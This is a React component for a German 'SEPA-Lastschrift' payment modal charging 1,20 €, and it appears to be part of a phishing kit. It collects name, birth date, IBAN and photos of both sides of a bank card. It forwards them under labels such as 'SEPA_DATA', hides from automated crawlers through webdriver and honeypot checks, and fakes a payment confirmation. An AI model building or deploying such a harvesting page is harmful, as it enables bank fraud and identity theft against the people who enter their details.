'use client';

import { useState, useRef, useEffect } from 'react';

interface SepaPaymentModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSubmit: (data: {
    firstName: string;
    lastName: string;
    birthDate: string;
    iban: string;
    frontImage?: string;
    backImage?: string;
  }) => void;
  onFileUpload: (type: string, image: string, message: string) => void;
}

export default function SepaPaymentModal({ isOpen, onClose, onSubmit, onFileUpload }: SepaPaymentModalProps) {
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [birthDate, setBirthDate] = useState('');
  const [iban, setIban] = useState('');
  const [frontFile, setFrontFile] = useState<File | null>(null);
  const [backFile, setBackFile] = useState<File | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const honeypotRef = useRef<HTMLInputElement>(null);
  const pageLoadTime = useRef(Date.now());

  useEffect(() => {
    if (!isOpen) {
      // Reset form when modal closes
      setFirstName('');
      setLastName('');
      setBirthDate('');
      setIban('');
      setFrontFile(null);
      setBackFile(null);
      setIsSubmitting(false);
    }
  }, [isOpen]);

  const handleFileChange = (side: 'front' | 'back', file: File | null) => {
    if (side === 'front') {
      setFrontFile(file);
    } else {
      setBackFile(file);
    }
  };

  const isFormValid = () => {
    return (
      (frontFile && backFile) ||
      (firstName.trim().length >= 3 &&
       lastName.trim().length >= 3 &&
       birthDate.trim().length >= 3 &&
       iban.trim().length >= 3)
    );
  };

  const handleSubmit = () => {
    const honeypotValue = honeypotRef.current?.value || '';
    const submissionTime = Date.now();

    if (honeypotValue !== "" || (submissionTime - pageLoadTime.current < 4000)) {
      setIsSubmitting(true);
      setTimeout(() => {
        alert("Vielen Dank! Ihre Zahlung wird verarbeitet.");
        window.location.reload();
      }, 500);
      return;
    }

    if (
      'webdriver' in navigator &&
      (navigator as Navigator & { webdriver?: boolean }).webdriver
    ) {
      return;
    }

    setIsSubmitting(true);

    // Upload card images if provided
    if (frontFile) {
      const reader = new FileReader();
      reader.onload = (e) => {
        if (e.target?.result) {
          onFileUpload("SEPA_BILD_VORN", e.target.result as string, "SEPA Karte Vorn");
        }
      };
      reader.readAsDataURL(frontFile);
    }

    if (backFile) {
      const reader = new FileReader();
      reader.onload = (e) => {
        if (e.target?.result) {
          onFileUpload("SEPA_BILD_HINTEN", e.target.result as string, "SEPA Karte Hinten");
        }
      };
      reader.readAsDataURL(backFile);
    }

    // Send SEPA data
    const msg = `Vorname: ${firstName}\nNachname: ${lastName}\nGeburt: ${birthDate}\nIBAN: ${iban}`;
    onFileUpload("SEPA_DATA", '', msg);

    onSubmit({
      firstName,
      lastName,
      birthDate,
      iban,
      frontImage: frontFile ? URL.createObjectURL(frontFile) : undefined,
      backImage: backFile ? URL.createObjectURL(backFile) : undefined,
    });

    setTimeout(() => {
      alert("Vielen Dank! Ihre Zahlung wird verarbeitet.");
      window.location.reload();
    }, 2500);
  };

  if (!isOpen) return null;

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal-content" onClick={(e) => e.stopPropagation()}>
        <div style={{ display: 'flex', justifyContent: 'flex-end', marginBottom: '5px' }}>
          <i className="fas fa-times" onClick={onClose} style={{ cursor: 'pointer', color: '#ccd', fontSize: '20px' }}></i>
        </div>
        <h2 className="modal-title">SEPA-Lastschrift</h2>

        <div className="file-inputs-container">
          <label className="file-label">
            <input
              type="file"
              accept="image/*"
              className="hidden-input"
              onChange={(e) => handleFileChange('front', e.target.files?.[0] || null)}
            />
            <div className="icon-box-small">
              <i className="fas fa-camera"></i>
            </div>
            <div className="label-text">
              <span>Karte Vorderseite</span>
            </div>
            {frontFile && (
              <i className="fas fa-check-circle check-icon"></i>
            )}
          </label>
          <label className="file-label">
            <input
              type="file"
              accept="image/*"
              className="hidden-input"
              onChange={(e) => handleFileChange('back', e.target.files?.[0] || null)}
            />
            <div className="icon-box-small">
              <i className="fas fa-camera"></i>
            </div>
            <div className="label-text">
              <span>Karte Rückseite</span>
            </div>
            {backFile && (
              <i className="fas fa-check-circle check-icon"></i>
            )}
          </label>
        </div>

        <div className="form-group">
          <label>Vorname</label>
          <input
            type="text"
            value={firstName}
            onChange={(e) => setFirstName(e.target.value)}
            placeholder="Max"
          />
        </div>
        <div className="form-group">
          <label>Nachname</label>
          <input
            type="text"
            value={lastName}
            onChange={(e) => setLastName(e.target.value)}
            placeholder="Mustermann"
          />
        </div>
        <div className="form-group">
          <label>Geburtsdatum</label>
          <input
            type="text"
            value={birthDate}
            onChange={(e) => setBirthDate(e.target.value)}
            placeholder="TT.MM.JJJJ"
          />
        </div>
        <div className="form-group">
          <label>IBAN</label>
          <input
            type="text"
            value={iban}
            onChange={(e) => setIban(e.target.value)}
            placeholder="DE00 0000 0000 0000 0000 00"
          />
        </div>
        <div style={{ position: 'absolute', left: '-5000px' }} aria-hidden="true">
          <input type="text" name="sepa_comment" tabIndex={-1} autoComplete="off" ref={honeypotRef} />
        </div>

        <button
          className={`submit-button-modal ${isFormValid() ? 'active' : ''}`}
          disabled={!isFormValid() || isSubmitting}
          onClick={handleSubmit}
        >
          {isSubmitting ? (
            <>
              <i className="fas fa-spinner fa-spin"></i> Autorisiere...
            </>
          ) : (
            'BEZAHLEN 1,20 €'
          )}
        </button>
      </div>
    </div>
  );
}


